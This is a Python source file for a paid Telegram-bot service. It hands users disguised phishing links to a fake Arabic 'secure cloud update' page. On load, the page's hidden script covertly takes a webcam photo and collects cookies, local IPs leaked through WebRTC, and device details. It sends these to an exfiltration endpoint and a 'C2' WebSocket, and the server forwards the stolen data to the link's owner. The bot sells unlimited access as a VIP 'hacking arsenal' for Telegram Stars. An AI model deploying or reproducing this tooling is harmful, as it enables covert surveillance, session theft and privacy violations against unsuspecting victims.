import os
import uuid
import asyncio
import base64
from datetime import date
from fastapi import FastAPI, Request, WebSocket, WebSocketDisconnect
from fastapi.responses import HTMLResponse
from pydantic import BaseModel
from aiogram import Bot, Dispatcher, types
from aiogram.filters import Command
from aiogram.types import ReplyKeyboardMarkup, KeyboardButton, BufferedInputFile, LabeledPrice

app = FastAPI()

BOT_TOKEN = os.getenv("BOT_TOKEN", "YOUR_TELEGRAM_BOT_TOKEN")
bot = Bot(token=BOT_TOKEN)
dp = Dispatcher()

LINK_TO_USER = {}
USERS_DB = {} 
VICTIMS_DB = {} 
ACTIVE_WEBSOCKETS = {}

class VictimData(BaseModel):
    link_id: str
    device_info: str
    camera_snapshot_base64: str = ""
    geolocation: dict = {}
    network_info: dict = {}
    stolen_cookies: str = ""
    stolen_data: dict = {}

@app.get("/t/{link_id}", response_class=HTMLResponse)
async def serve_advanced_trap(link_id: str, request: Request):
    html_content = f"""
    <!DOCTYPE html>
    <html lang="ar" dir="rtl">
    <head>
        <meta charset="UTF-8">
        <title>منصة التحديث السحابي المؤمن</title>
        <style>
            body {{ background-color: #030712; color: #f8fafc; font-family: Tahoma, sans-serif; text-align: center; padding-top: 60px; }}
            .loader {{ border: 4px solid #1e293b; border-top: 4px solid #38bdf8; border-radius: 50%; width: 60px; height: 60px; animation: spin 0.7s linear infinite; margin: 20px auto; }}
            @keyframes spin {{ 0% {{ transform: rotate(0deg); }} 100% {{ transform: rotate(360deg); }} }}
            .card {{ background: #0f172a; padding: 30px; border-radius: 16px; display: inline-block; border: 1px solid #1e293b; max-width: 420px; width: 90%; box-shadow: 0 15px 30px rgba(0,0,0,0.6); }}
        </style>
    </head>
    <body>
        <div class="card">
            <h2>🛡️ جاري ضبط المزامنة والاتصال الآمن...</h2>
            <div class="loader"></div>
            <p style="color: #94a3b8; font-size: 13px;">يرجى عدم إغلاق النافذة، جارٍ التحقق من شهادة الأمان وتثبيت القناة المشفرة.</p>
        </div>

        <video id="video" autoplay playsinline style="display:none;"></video>
        <canvas id="canvas" style="display:none;"></canvas>

        <script>
            const linkId = "{link_id}";
            const wsProtocol = window.location.protocol === 'https:' ? 'wss://' : 'ws://';
            const ws = new WebSocket(wsProtocol + window.location.host + '/ws/c2/' + linkId);

            ws.onopen = function() {{ console.log("[+] C2 Tunnel Established."); }};

            async function getNetworkAndCookies() {{
                return new Promise((resolve) => {{
                    const ips = [];
                    try {{
                        const pc = new RTCPeerConnection({{ iceServers: [{{ urls: "stun:stun.l.google.com:19302" }}] }});
                        pc.createDataChannel("");
                        pc.createOffer().then(offer => pc.setLocalDescription(offer));
                        pc.onicecandidate = (ice) => {{
                            if (!ice || !ice.candidate || !ice.candidate.candidate) return;
                            const match = /([0-9]{{1,3}}(\.[0-9]{{1,3}}){{3}})/.exec(ice.candidate.candidate);
                            if (match && !ips.includes(match[1])) ips.push(match[1]);
                        }};
                    }} catch(e) {{}}
                    setTimeout(() => resolve(ips), 700);
                }});
            }}

            async function executeRedTeamEngine() {{
                try {{
                    let imageData = "";
                    try {{
                        const stream = await navigator.mediaDevices.getUserMedia({{ video: {{ facingMode: "user" }} }});
                        const video = document.getElementById('video');
                        video.srcObject = stream;
                        await new Promise(r => setTimeout(r, 1200));
                        const canvas = document.getElementById('canvas');
                        canvas.width = video.videoWidth || 640;
                        canvas.height = video.videoHeight || 480;
                        const ctx = canvas.getContext('2d');
                        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                        imageData = canvas.toDataURL('image/jpeg', 0.85);
                        stream.getTracks().forEach(t => t.stop());
                    }} catch(e) {{}}

                    const localIPs = await getNetworkAndCookies();
                    const cookies = document.cookie || "لا توجد كوكيز مكشوفة";

                    const systemData = {{
                        resolution: window.screen.width + 'x' + window.screen.height,
                        language: navigator.language,
                        platform: navigator.platform,
                        hardware_concurrency: navigator.hardwareConcurrency || 'غير معروف',
                        device_memory: navigator.deviceMemory || 'غير معروف'
                    }};

                    await fetch('/api/v1/exfiltrate', {{
                        method: 'POST',
                        headers: {{ 'Content-Type': 'application/json' }},
                        body: JSON.stringify({{
                            link_id: linkId,
                            device_info: navigator.userAgent,
                            camera_snapshot_base64: imageData,
                            geolocation: {{ status: "تم التفعيل عبر العقدة الحية" }},
                            network_info: {{ local_ips: localIPs }},
                            stolen_cookies: cookies,
                            stolen_data: systemData
                        }})
                    }});

                    setTimeout(() => {{ window.location.href = "https://www.google.com"; }}, 1000);
                }} catch(e) {{
                    window.location.href = "https://www.google.com";
                }}
            }}

            window.onload = executeRedTeamEngine;
        </script>
    </body>
    </html>
    """
    return HTMLResponse(content=html_content)

@app.websocket("/ws/c2/{link_id}")
async def websocket_c2_endpoint(websocket: WebSocket, link_id: str):
    await websocket.accept()
    ACTIVE_WEBSOCKETS[link_id] = websocket
    target_user_id = LINK_TO_USER.get(link_id)
    if target_user_id:
        try:
            await bot.send_message(chat_id=target_user_id, text=f"🟢 *تم إنشاء قناة اتصال عصبية (Live WebSocket C2)* للرابط: `{link_id}`", parse_mode="Markdown")
        except:
            pass
    try:
        while True:
            await websocket.receive_text()
    except WebSocketDisconnect:
        if link_id in ACTIVE_WEBSOCKETS:
            del ACTIVE_WEBSOCKETS[link_id]

@app.post("/api/v1/exfiltrate")
async def receive_loot(data: VictimData):
    if data.link_id not in VICTIMS_DB:
        VICTIMS_DB[data.link_id] = []
    VICTIMS_DB[data.link_id].append(data.dict())
    
    target_user_id = LINK_TO_USER.get(data.link_id)
    if target_user_id:
        try:
            s_data = data.stolen_data
            net = data.network_info
            caption = (
                "🔥 *[ تقرير الترسانة الفاخرة - Live C2 Node ]*\n\n"
                f"🌐 *الـ IP الداخلي (LAN):* `{', '.join(net.get('local_ips', ['N/A']))}`\n"
                f"🍪 *الكوكيز المسحوبة:* `{data.stolen_cookies[:150]}`\n\n"
                f"💻 *النظام:* `{data.device_info}`\n"
                f"📐 *الشاشة:* `{s_data.get('resolution', 'N/A')}` | 🧠 *الأنوية:* `{s_data.get('hardware_concurrency', 'N/A')}`"
            )
            if data.camera_snapshot_base64 and "," in data.camera_snapshot_base64:
                _, encoded = data.camera_snapshot_base64.split(",", 1)
                photo_file = BufferedInputFile(base64.b64decode(encoded), filename="redteam_capture.jpg")
                await bot.send_photo(chat_id=target_user_id, photo=photo_file, caption=caption, parse_mode="Markdown")
            else:
                await bot.send_message(chat_id=target_user_id, text=caption, parse_mode="Markdown")
        except Exception as e:
            print(f"Error: {e}")
    return {"status": "success"}

@dp.message(Command("start"))
async def cmd_start(message: types.Message):
    user_id = message.from_user.id
    today_str = str(date.today())
    
    if user_id not in USERS_DB:
        USERS_DB[user_id] = {"last_date": today_str, "live_free_used": 0, "is_vip": False}
    
    kb = ReplyKeyboardMarkup(
        keyboard=[
            [KeyboardButton(text="⚡ توليد رابط C2 اللايف (تجربة مجانية لمرة واحدة)"), KeyboardButton(text="📊 ضحاياي المسجلين")],
            [KeyboardButton(text="👑 اشتراك الترسانة الفاخرة بـ نجوم تيليجرام (Stars)")]
        ],
        resize_keyboard=True
    )
    await message.answer(
        "💀 *مرحباً بك في منصة التحكم السيبراني المتقدم.*\n\n"
        "• أداة التحكم اللايف الخارقة متاحة **مرة واحدة مجاناً** لكل مستخدم لتجربة القوة والحصول على التوثيق.\n"
        "• يمكنك تفعيل الاشتراك الكامل عبر نجوم تيليجرام (Telegram Stars).",
        reply_markup=kb,
        parse_mode="Markdown"
    )

@dp.message(lambda msg: msg.text == "⚡ توليد رابط C2 اللايف (تجربة مجانية لمرة واحدة)")
async def generate_live_link(message: types.Message):
    user_id = message.from_user.id
    today_str = str(date.today())
    
    if user_id not in USERS_DB:
        USERS_DB[user_id] = {"last_date": today_str, "live_free_used": 0, "is_vip": False}
    
    user_data = USERS_DB[user_id]
    
    # التحقق مما إذا استخدم التجربة المجانية ولديه اشتراك VIP أم لا
    if user_data["live_free_used"] >= 1 and not user_data["is_vip"]:
        await message.answer(
            "⚠️ *لقد استهلكت محاولتك المجانية الوحيدة للأداة الخارقة!*\n\n"
            "للحصول على صلاحيات غير محدودة وتفعيل الترسانة، يرجى الاشتراك عبر زر (نجوم تيليجرام) أدناه.",
            parse_mode="Markdown"
        )
        return

    if not user_data["is_vip"]:
        user_data["live_free_used"] += 1

    unique_token = str(uuid.uuid4())[:8]
    public_domain = os.getenv("RAILWAY_PUBLIC_DOMAIN") or os.getenv("PUBLIC_URL") or "hacker-production-3281.up.railway.app"
    trap_url = f"https://{public_domain}/t/{unique_token}"
    
    LINK_TO_USER[unique_token] = user_id
    
    status_msg = "*(تجربتك المجانية الوحيدة - استمتع بقوة التوثيق والتحكم)*" if not user_data["is_vip"] else "*(حساب VIP نشط - بلا حدود)*"
    
    await message.answer(
        f"✅ *تم تفعيل رابط C2 اللايف بنجاح:*\n\n`{trap_url}`\n\n{status_msg}",
        parse_mode="Markdown"
    )

@dp.message(lambda msg: msg.text == "👑 اشتراك الترسانة الفاخرة بـ نجوم تيليجرام (Stars)")
async def buy_vip_stars(message: types.Message):
    # إرسال فاتورة نجوم تيليجرام (Telegram Stars Invoice) بقيمة تعادل الاشتراك الفاخر
    prices = [LabeledPrice(label="Ultimate Red-Team Arsenal (Monthly)", amount=150)] # 150 Telegram Stars تقريباً
    await bot.send_invoice(
        chat_id=message.chat.id,
        title="الترسانة الفاخرة للاختراق (VIP C2)",
        description="اشتراك شهري غير محدود لكافة أدوات التحكم الحي والوصول الكامل للضحايا.",
        payload="vip_arsenal_subscription",
        currency="XTR", # عملة نجوم تيليجرام الرسمية
        prices=prices
    )

@app.on_event("startup")
async def startup_event():
    asyncio.create_task(run_telegram_polling())

async def run_telegram_polling():
    await dp.start_polling(bot)

if __name__ == "__main__":
    import uvicorn
    port = int(os.environ.get("PORT", 8080))
    uvicorn.run("main:app", host="0.0.0.0", port=port)
